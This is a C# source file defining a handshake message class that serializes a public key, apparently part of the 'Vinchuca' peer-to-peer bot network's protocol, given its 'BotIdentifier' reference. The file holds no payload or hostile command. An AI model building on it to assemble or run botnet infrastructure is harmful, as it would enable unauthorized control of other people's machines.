using System.IO;

namespace Vinchuca.Network.Protocol.Messages.System
{
    public class HelloSynMessage : Message
    {
        public byte[] PublicKey { get; set; }

        public HelloSynMessage()
        {
            PublicKey = BotIdentifier.PublicKey;
        }

        public override void EncodePayload(BinaryWriter w)
        {
            w.Write((short) PublicKey.Length);
            w.Write(PublicKey);
        }

        public override void DecodePayload(BinaryReader br)
        {
            var len = br.ReadInt16();
            PublicKey = br.ReadBytes(len);
        }
    }
}